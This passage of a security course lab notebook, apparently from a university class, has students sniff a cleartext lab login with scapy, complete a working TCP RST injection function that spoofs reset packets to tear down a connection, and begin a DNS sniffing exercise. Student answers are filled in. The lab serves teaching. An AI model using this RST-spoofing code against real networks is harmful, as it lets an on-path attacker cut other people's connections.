      "     src       = 127.0.0.1\n",
      "     dst       = 127.0.0.1\n",
      "     \\options   \\\n",
      "###[ TCP ]### \n",
      "        sport     = 57629\n",
      "        dport     = 4560\n",
      "        seq       = 2966646469\n",
      "        ack       = 3608283257\n",
      "        dataofs   = 8\n",
      "        reserved  = 0\n",
      "        flags     = PA\n",
      "        window    = 6379\n",
      "        chksum    = 0xfe58\n",
      "        urgptr    = 0\n",
      "        options   = [('NOP', None), ('NOP', None), ('Timestamp', (1367315383, 1367315383))]\n",
      "###[ Raw ]### \n",
      "           load      = '{\"username\": \"evanbot\", \"password\": \"bot>human\"}'\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# TODO: YOUR CODE HERE [to answer Checkpoint Question 1.3]\n",
    "print(useful_packets[5].payload)\n",
    "useful_packets[5].show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:39:02.712804Z",
     "start_time": "2021-04-17T09:39:02.706601Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'scapy.fields.FlagValue'>\n"
     ]
    }
   ],
   "source": [
    "print(useful_packets[5][TCP].flags.__class__)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">\n",
    "    username: evanbot\n",
    "    password: bot>human\n",
    "    the pair is incorrect\n",
    "</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "# Attack #2: Perform a RST Injection Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Congratulations, you're now officially an on-path attacker! You were able to observe a login event occurring over HTTP without alerting either party of your malicious actions.\n",
    "\n",
    "In this section, we're going to take your hacking skills one step further. It's time to simulate a **RST Injection Attack**! \n",
    "\n",
    "### Background\n",
    "Assume Alice and Bob are communicating over a TCP connection. For every data packet that Alice sends to Bob, Bob replies with a packet with the **ACK** flag set. This indicates a successful acknowledgement of recieving the packet. If Alice doesn't recieve the **ACK**, she can re-send the packet over and over again (to a certain limit) until Bob recieves it and acknowledges it with an **ACK**.  \n",
    "\n",
    "To terminate a TCP connection, either party can send a TCP packet with the **RST ('R')** flag set. If the sequence number of the **RST** is valid, then the connection will be terminated immediately.\n",
    "\n",
    "Examples of groups that have used this technique include:\n",
    "- China (the Great Firewall)\n",
    "- Comcast (to block BitTorrent uploads)\n",
    "- Some intrusion detection systems, to mitigate attacks in progress"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 1.4\n",
    "* **What information do we need to know or guess in order to perform a RST Injection Attack?**\n",
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">IP:port and SEQ</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Simulate an Active TCP Connection + Inject a RST Packet"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this section, we're going to walk through performing a RST Injection Attack by observing communication on a webserver and injecting RST packets to terminate the connection."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Instructions:**\n",
    "1. Change directory to the attack2 folder (`cd attack2`)\n",
    "2. In T1, start the web server by running `python server.py --port 2020`\n",
    "3. In T2, start the client simulation by running `python client.py --port 2020` (in a separate terminal window)\n",
    "4. Proceed below.\n",
    "\n",
    "_(If you're using a virtual environment, make sure both windows also run in the same environment)_\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Construct the Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this attack, we have an active TCP connection to the web server running on port 2020. Our goal, as an on-path attacker, is to construct a packet injection function that responds to any sniffed packets by injecting a packet with the RST Flag set."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Fill out the appropriate segments below to proceed."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:43:37.791514Z",
     "start_time": "2021-04-17T09:43:37.784793Z"
    }
   },
   "outputs": [],
   "source": [
    "# TODO: Fill out the appropriate fields below.\n",
    "\n",
    "def inject_packet(packet):\n",
    "    \"\"\"\n",
    "    This is a 'callback' - it's a function that's called as soon as we intercept a packet.\n",
    "    Our goal is to execute a RST Injection Attack on this connection by injecting a malicious packet.\n",
    "    \n",
    "    Hint: you will need to use these values when constructing your spoofed packet.\n",
    "    \n",
    "    - packet[IP].src\n",
    "    - packet[IP].dst\n",
    "    - packet[TCP].sport\n",
    "    - packet[TCP].dport\n",
    "    - packet[TCP].seq\n",
    "    - packet[TCP].ack\n",
    "    \n",
    "    \"\"\"\n",
    "    RST=0x04\n",
    "    # Construct the IP Layer and the TCP Layer.\n",
    "    ip_layer = IP(src= packet[IP].dst, \n",
    "                  dst= packet[IP].src)\n",
    "\n",
    "    tcp_layer = TCP(sport=packet[TCP].dport, \n",
    "                    dport=packet[TCP].sport, \n",
    "                    flags=RST,\n",
    "                    window=512, \n",
    "                    seq=packet[TCP].ack)\n",
    "\n",
    "    # Enclose the TCP Layer within an IP Layer.\n",
    "    response_packet = ip_layer / tcp_layer\n",
    "    \n",
    "    # Send the packet.\n",
    "    send(response_packet, verbose=0, iface=NETWORK_INTERFACE)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:35:58.928318Z",
     "start_time": "2021-04-17T09:35:58.834637Z"
    }
   },
   "outputs": [],
   "source": [
    "TCP?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After you run the cell below, go to the terminal window that you were running the `server.py` file in. You should see a `BrokenPipeError` indicating the connection was terminated. If you don't see that, then you might have to tweak the values of your setup."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:43:41.924721Z",
     "start_time": "2021-04-17T09:43:41.705189Z"
    }
   },
   "outputs": [],
   "source": [
    "packets = sniff(filter=\"port 2020\", prn=inject_packet, iface=NETWORK_INTERFACE, count=20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 1.5\n",
    "* **What was the code printed when you terminated the connection? (This makes sure you actually successfully performed the RST Injection Attack).**\n",
    "* **Would an off-path attacker be able to perform a RST Injection Attack?**\n",
    "* **Would a RST Injection Attack work on HTTPS traffic?**\n",
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">\n",
    "    1. What was the code printed when you terminated the connection? evanbot-is-sad\n",
    "    2. Would an off-path attacker be able to perform a RST Injection Attack? It's very hard, because the attacker needs to guess the seq right.\n",
    "    3. Would a RST Injection Attack work on HTTPS traffic? Yes.\n",
    "    \n",
    "</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Part 2: Other Networking Topics"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This part requires the `dig` command-line tool in order to work properly. It comes built in on MacOS and Linux, but if you're on Windows, you may need to install it [here](https://help.dyn.com/how-to-use-binds-dig-tool/). If you're having issues, please make a Piazza post!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Quick Review: DNS"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The Internet is commonly indexed in two different ways. Humans refer to websites using human-readable names such as http://google.com and http://eecs.berkeley.edu, while computers refer to websites using IP addresses such as `172.217.4.174` and `23.195.69.108`. DNS, or the Domain Name System, is the protocol that translates between the two.\n",
    "\n",
    "Your local computer usually delegates the task of DNS lookups to a **DNS Recursive Resolver**, which sends the queries, processes the responses, and maintains an internal cache of records. When performing a lookup, the **DNS Stub Resolver** on your computer sends a query to the recursive resolver, lets it do all the work, and receives the response. The recursive resolver is usually provided by your ISP and/or configured into your network connection by DHCP.\n",
    "\n",
    "The **DNS Authority Servers** or name servers are servers on the Internet responsible for answering DNS queries. There is a special set of authority servers, the root servers, that are publicly known - you can see them for yourself here."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Sniff DNS Lookup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To start, we're going to take a look at the structure of a DNS Lookup. Run the cell below, and run `dig eecs.berkeley.edu` immediately after in a terminal window. You should see two packets printed below: a DNS Query, and a DNS Answer. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:46:58.614334Z",
     "start_time": "2021-04-17T09:46:56.609205Z"
    },
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "#! /usr/bin/env python3\n",
    "\n",
    "from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP\n",
    "def print_packet(p):\n",
    "    print(p.summary())\n",
    "    \n",
    "packets=sniff(prn=print_packet, lfilter=lambda x: x.haslayer(DNS), count=2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 2.1\n",
    "* **What is the structure of the DNS Query & Response?**\n",
    "* **Does the DNS Query & Response use TCP or UDP? Why do you think so?**\n",
    "* **What is the IP Address of your DNS Recursive Resolver?**\n",
    "***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# YOUR CODE HERE for Checkpoint Question 2.1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">(YOUR ANSWERS HERE)</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
